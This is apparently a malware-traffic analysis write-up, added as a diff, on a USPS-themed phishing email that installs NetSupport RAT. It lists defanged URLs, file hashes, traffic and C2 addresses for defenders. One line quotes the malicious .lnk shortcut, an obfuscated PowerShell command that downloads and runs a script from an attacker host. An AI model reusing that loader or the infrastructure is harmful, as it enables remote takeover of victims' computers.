@@ -1,0 +1,90 @@
+2022-12-28 (WEDNESDAY): USPS-THEMED EMAIL PUSHES NETSUPPORT RAT
+
+REFERENCE:
+
+- https://twitter.com/Unit42_Intel/status/1608185209329008641
+
+INFECTION CHAIN:
+
+- email --> link --> downloaded zip --> extracted .js or .lnk --> HTTP traffic for script to create NetSupport RAT --> NetSupport RAT C2
+
+NOTES:
+
+- For each download, the downloaded zip archive and its contents are a different file name and file hash.
+- In some cases, the downloaded zip contained a JavaScript (.js) file.  In other cases, the zip contains a Windows shortcut (.lnk) file.
+- NetSupport Manager is a legitimate multi-platform remote control and support software.
+- Criminals use stolen versions of NetSupport Manager to create software packages for Remote Access Tool (RAT) malware.
+
+SELECT HEADER LINES FROM THE MALICIOUS EMAIL:
+
+- Received: from 218bc2699d59746f4ce65e55a0f15103d3 (35.196.193[.]120) by [information removed]; Wed, 28 Dec 2022 09:10:52 +0000
+- Date: Wed, 28 Dec 2022 12:10:29 +0300
+- From: USPostalService <wainani@soclar[.]net>
+- Subject: Your USPS.com package is at the store ready for delivery
+- Message-Id: <af7522897db99398bc064fe4e185ae30f710c5@soclar[.]net>
+
+URL FROM THE MALICIOUS EMAIL:
+
+- hxxp://lbbyqrluzu.cracknight[.]ru/dHJw183la23jm?q=9250194086
+
+URL CHAIN FOR ZIP DOWNLOAD:
+
+- hxxp://lbbyqrluzu.cracknight[.]ru/dHJw183la23jm?q=9250194086
+- hxxps://www.patrickforeilly[.]com/wp-red/
+- hxxps://index-opensocial.googleusercontent[.]com/gadgets/ifr?url=hxxps://www.patrickforeilly[.]com/wp/Track
+- hxxps://www.patrickforeilly[.]com/wp/
+
+FILES FROM AN INFECTED WINDOWS HOST:
+
+- SHA256 hash: 4a68991d88cf135b126a607ee891655ace36a3caac2bbd828d62d7ec5e5ebc08
+- File size: 7,958 bytes
+- File name: 31604101.zip
+- File description: Example 1 of 2 for downloaded zip archive from hxxps://www.patrickforeilly[.]com/wp/
+- Note: file name/hash is different for each zip download
+
+- SHA256 hash: 5272f5c3b5811e6a35087a252b9700e48e137ba3cddbc5b0b6158f860820cf61
+- File size: 29,067 bytes
+- File name: 5645_M.js
+- File description: JavaScript (.js) file extracted from the above zip archive
+
+- SHA256 hash: 70957cb10b64845f9b5f588249905c3f10f358f0894d2dbf21497661bff97869
+- File size: 1,047 bytes
+- File name: 18520987.zip
+- File description: Example 2 of 2 for downloaded zip archive from hxxps://www.patrickforeilly[.]com/wp/
+- Note: file name/hash is different for each zip download
+
+- SHA256 hash: 8e170014a056adbd653b54db4115026659cd11103584ea971ac987109059cc7b
+- File size: 2,392 bytes
+- File name: 3123_NS.lnk
+- File description: Windows shortcut (.lnk) file extracted from the above zip archive
+- Shortcut: %SystemRoot%\system32\conhost.exe --headless powershell $gtV='et';new-alias y wg$gtV;.$([char](7467-7362)+'ex')(y -useb hxxp://1otal[.]com/index/index.php)
+
+- SHA256 hash: 8000aa6ab8ff41bd2495e7faa4edae8a43d23307a28d164efe6248f1c7447cc1
+- File size: 3,799,050 bytes
+- File location: hxxp://1otal[.]com/index/index.php
+- File description: Obfuscated script used to create malicious NetSupport RAT package for this infection
+
+- SHA256 hash: e4985a9739637aad4a409c95da33a1304dc17fd6ef9046159b27c0b137a57911
+- File size: 112,360 bytes
+- File location: C:\Users\[username]\AppData\Roaming\IRomvWG3\presentationhost.exe
+- File description: NetSupport Manager version 12.80.0.400 EXE used for this maliciously-created NetSupport package
+- Note: By itself, this file is not inherently malicious, but it is an indicator for this specific infection chain
+
+TRAFFIC FROM AN INFECTED WINDOWS HOST:
+
+- 31.41.244[.]107 port 80 - lbbyqrluzu.cracknight[.]ru - GET /dHJw183la23jm?q=9250194086
+- 78.153.214[.]6 port 443 (HTTPS traffic) - www.patrickforeilly[.]com - GET /wp-red/ 
+- port 443 (HTTPS traffic)- tools-opensocial.googleusercontent[.]com - GET /gadgets/ifr?url=hxxps://www.patrickforeilly[.]com/wp/Track
+- 78.153.214[.]6 port 443 (HTTPS traffic) - www.patrickforeilly[.]com - GET /wp/ 
+- port 443 (HTTPS traffic) - tools.usps[.]com - USPS tracking page, not malicious
+- 79.137.202[.]132 port 80 - 1otal[.]com  GET /index/index.php
+- port 80 - geo.netsupportsoftware[.]com - GET /location/loca.asp
+- 89.185.85[.]44 port 2145 - 89.185.85[.]44 - POST hxxp://89.185.85[.]44/fakeurl.htm HTTP/1.1  (application/x-www-form-urlencoded)
+
+Addresses from client32.ini file used by NetSupport Manager EXE:
+
+GatewayAddress=Npinmclaugh11[.]com:2145
+Port=2145
+
+SecondaryGateway=Npinmclaugh14[.]com:2145
+Port=2145
